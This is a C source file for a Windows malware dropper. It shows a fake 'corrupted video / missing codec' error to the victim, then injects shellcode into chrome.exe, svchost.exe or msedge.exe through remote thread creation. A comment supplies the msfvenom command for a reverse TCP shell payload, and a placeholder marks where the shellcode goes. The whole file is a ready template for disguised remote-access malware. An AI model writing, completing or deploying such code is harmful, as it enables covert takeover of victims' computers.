#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>

BOOL process_injection(DWORD pid, unsigned char* code, SIZE_T code_size) {
    HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!process_handle) return FALSE;

    LPVOID remote_buffer = VirtualAllocEx(process_handle, NULL, code_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_buffer) {
        CloseHandle(process_handle);
        return FALSE;
    }

    if (!WriteProcessMemory(process_handle, remote_buffer, code, code_size, NULL)) {
        VirtualFreeEx(process_handle, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(process_handle);
        return FALSE;
    }

    HANDLE thread_handle = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)remote_buffer, NULL, 0, NULL);
    if (!thread_handle) {
        CloseHandle(process_handle);
        return FALSE;
    }

    CloseHandle(thread_handle);
    CloseHandle(process_handle);
    return TRUE;
}

DWORD get_target_pid() {
    DWORD pid = 0;
    const char* target_process[] = {"chrome.exe", "svchost.exe", "msedge.exe"};

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    for (int i = 0; i < 3; i++) {
        if (Process32First(snapshot, &pe32)) {
            do {
                if (stricmp(pe32.szExeFile, target_process[i]) == 0) {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &pe32));
        }
        if (pid != 0) break;
    }
    CloseHandle(snapshot);
    return pid;
}

int main() {
    MessageBox(NULL, "Error: The video file is corrupted or required codec (0xC004F011) is missing.", "Media Player Error", MB_ICONERROR | MB_OK);
    
    DWORD pid = get_target_pid();
    if (pid == 0) {
        return 1;
    }

    // msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR IP LPORT=4444 -f c
    // end with \xc3
    unsigned char shellcode[] = "SHELLCODE HERE";

    SIZE_T shellcode_size = sizeof(shellcode);
    if (process_injection(pid, shellcode, shellcode_size)) {
        ExitProcess(0);
    }
    return 0;
}
